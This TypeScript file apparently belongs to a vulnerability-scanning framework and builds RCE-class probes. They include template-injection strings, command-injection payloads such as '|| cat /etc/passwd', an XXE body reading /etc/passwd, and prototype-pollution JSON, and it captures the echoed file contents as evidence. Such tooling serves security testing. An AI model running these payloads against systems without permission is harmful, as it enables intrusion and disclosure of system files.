/**
 * rceClass — RCE-Class Exploit primitive.
 *
 * Detects remote-code-execution-class bugs by injecting distinct payloads into
 * a target parameter (or JSON/XML body) and watching the response for the
 * signature each class leaves behind:
 *   - SSTI   (server-side template injection): response reflects `49` / `7777777`
 *   - CMD    (OS command injection):          response echoes `uid=` / `root:` / `/bin/`
 *   - PROTO  (prototype pollution sink):       injected `polluted` marker echoes back
 *   - XXE    (XML external entity):            file disclosure echoes `root:` / `/bin/`
 *
 * All verdicts are gated by the EvidenceGate — a confirmation is only returned
 * when a recorded step's response matches its expected signature AND the claim
 * is structurally backed by a recorded evidence item (no hallucination).
 */

import type {
  TechniquePrimitive,
  TechniqueContext,
  AttackStep,
  StepExecutionResult,
  PrimitiveResult,
} from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'
import { getPayloadStore } from '../payloads/store'

/** Pick the parameter name to inject into. */
function paramName(ctx: TechniqueContext, method: string): string {
  if (ctx.param) return ctx.param
  return method === 'GET' ? 'q' : 'input'
}

export const rceClass: TechniquePrimitive = {
  id: 'rceClass',
  name: 'RCE-Class Exploits',
  description:
    'Detects remote-code-execution-class bugs: SSTI, OS command injection, prototype-pollution sinks, and XML/XXE file disclosure.',
  technique: 'injection',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    const method = (ctx.endpoint?.method ?? 'GET').toUpperCase()
    const hasParamField =
      !!ctx.param || (ctx.endpoint?.params?.length ?? 0) > 0
    // GET needs a query param (defaulted to "q"); non-GET can inject via body.
    if (method === 'GET') return hasParamField || true
    return true
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const baseUrl = ctx.endpoint?.url ?? ctx.target!
    const method = (ctx.endpoint?.method ?? 'GET').toUpperCase()
    const param = paramName(ctx, method)
    const sessionHeaders = ctx.sessionHeaders ?? {}
    const sep = baseUrl.includes('?') ? '&' : '?'
    const steps: AttackStep[] = []

    const sstiPayloads = getPayloadStore().getPayloads('ssti/generic') || ['${{7*7}}', "{{7*'7'}}", '<%= 7*7 %>']
    const cmdPayloads = getPayloadStore().getPayloads('command-injection/unix', 'unix') || ['; id', '| whoami', '$(id)', '|| cat /etc/passwd']
    const xxeBody = (getPayloadStore().getPayloads('xxe/oob') || ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'])[0]
    const protoBody = (getPayloadStore().getPayloads('prototype-pollution/client') || [JSON.stringify({ __proto__: { polluted: 'yes' } })])[0]

    // 1. SSTI — template-injection probes via the target param.
    for (const p of sstiPayloads) {
      const url =
        method === 'GET'
          ? `${baseUrl}${sep}${param}=${encodeURIComponent(p)}`
          : baseUrl
      const body =
        method === 'GET' ? undefined : JSON.stringify({ [param]: p })
      const headers =
        method === 'GET'
          ? sessionHeaders
          : { ...sessionHeaders, 'content-type': 'application/json' }
      steps.push({
        id: `rce-ssti-${steps.length}`,
        description: `SSTI template-injection probe: ${p}`,
        request: { method, url, headers, body },
        expectedSignal: 'response reflects 49 / 7777777',
        metadata: { kind: 'ssti', payload: p },
      })
    }

    // 2. CMD — OS command injection via the target param.
    for (const p of cmdPayloads) {
      const url =
        method === 'GET'
          ? `${baseUrl}${sep}${param}=${encodeURIComponent(p)}`
          : baseUrl
      const body =
        method === 'GET' ? undefined : JSON.stringify({ [param]: p })
      const headers =
        method === 'GET'
          ? sessionHeaders
          : { ...sessionHeaders, 'content-type': 'application/json' }
      steps.push({
        id: `rce-cmd-${steps.length}`,
        description: `OS command-injection probe: ${p}`,
        request: { method, url, headers, body },
        expectedSignal: 'response echoes uid= / root: / /bin/',
        metadata: { kind: 'cmd', payload: p },
      })
    }

    // 3. PROTO — prototype-pollution sink via JSON body + read-back step.
    steps.push({
      id: 'rce-proto-pollute',
      description: 'Prototype-pollution sink injection via __proto__',
      request: {
        method: 'POST',
        url: baseUrl,
        headers: { ...sessionHeaders, 'content-type': 'application/json' },
        body: protoBody,
      },
      expectedSignal: 'injected "polluted" marker controllable',
      metadata: { kind: 'proto', payload: '__proto__' },
    })
    steps.push({
      id: 'rce-proto-read',
      description: 'Read back to detect prototype pollution echo',
      request: { method: 'GET', url: baseUrl, headers: sessionHeaders },
      expectedSignal: 'polluted marker echoes in response',
      metadata: { kind: 'proto', payload: 'read' },
    })

    // 4. XXE — XML external entity file disclosure.
    steps.push({
      id: 'rce-xxe',
      description: 'XXE file disclosure via external entity',
      request: {
        method: 'POST',
        url: baseUrl,
        headers: { ...sessionHeaders, 'content-type': 'application/xml' },
        body: xxeBody,
      },
      expectedSignal: 'response echoes root: / /bin/ (file contents)',
      metadata: { kind: 'xxe', payload: 'xxe' },
    })

    return steps
  },
  async oracle(
    results: StepExecutionResult[],
    evidenceGate: EvidenceGate,
  ): Promise<PrimitiveResult> {
    const fired: Array<{ kind: string; r: StepExecutionResult }> = []

    for (const r of results) {
      const kind = (r.step.metadata?.kind as string) ?? ''
      const body = r.body ?? ''
      let hit = false
      switch (kind) {
        case 'ssti':
          hit = body.includes('49') || body.includes('7777777')
          break
        case 'cmd':
          hit =
            body.includes('uid=') || body.includes('root:') || body.includes('/bin/')
          break
        case 'proto':
          hit = body.includes('polluted')
          break
        case 'xxe':
          hit = body.includes('root:') || body.includes('/bin/')
          break
      }
      if (hit) fired.push({ kind, r })
    }

    if (fired.length === 0) {
      return {
        confirmed: false,
        confidence: 0.1,
        evidence: [],
        note: 'no RCE-class signature observed in any response',
      }
    }

    // Representative step whose response actually fired (evidence source).
    const repr = fired[0].r

    // Claim MUST be backed by a recorded evidence item (status/url co-occurrence).
    const { verified } = evidenceGate.verifyClaim(
      claimFor('rce', repr.step.request.url, repr.status, repr.step.request.method),
    )

    const confirmed = verified
    const critical = fired.some((f) => f.kind === 'cmd' || f.kind === 'xxe')
    const severity = critical ? 'critical' : 'high'

    // W2 — capture concrete exfiltrated impact (file contents echoed by the
    // payload) as a typed data artifact folded into the proof's impact.
    const exfil = fired.find((f) => f.kind === 'cmd' || f.kind === 'xxe')
    const dataArtifact = exfil
      ? {
          kind: 'exfil' as const,
          label: `RCE-class response (${exfil.kind}) from ${exfil.r.step.request.url}`,
          data: (exfil.r.body ?? '').slice(0, 1500),
        }
      : undefined

    const cweMap: Record<string, string> = {
      ssti: 'CWE-94',
      cmd: 'CWE-77',
      proto: 'CWE-94',
      xxe: 'CWE-91',
    }
    const primaryKind = fired[0].kind
    const cwe = cweMap[primaryKind] ?? 'CWE-94'

    const evidence = fired.map((f) => ({
      kind: 'response' as const,
      label: `${f.r.step.request.method} ${f.r.step.request.url} → ${f.r.status} (${f.kind})`,
      data: (f.r.body ?? '').slice(0, 1500),
      ref: f.r.step.id,
    }))

    return {
      confirmed,
      confidence: confirmed ? (critical ? 0.9 : 0.8) : 0.3,
      evidence,
      severity,
      finding: confirmed
        ? {
            category: 'rce',
            description: `RCE-class vulnerability (${primaryKind}) detected at ${repr.step.request.url}: response matched expected signature.`,
            request: repr.step.request,
            response: {
              status: repr.status ?? 0,
              body: (repr.body ?? '').slice(0, 1000),
            },
            cwe,
          }
        : undefined,
      dataArtifact,
      note: `fired=${fired.map((f) => f.kind).join(',')} verified=${verified} severity=${severity}`,
    }
  },
}
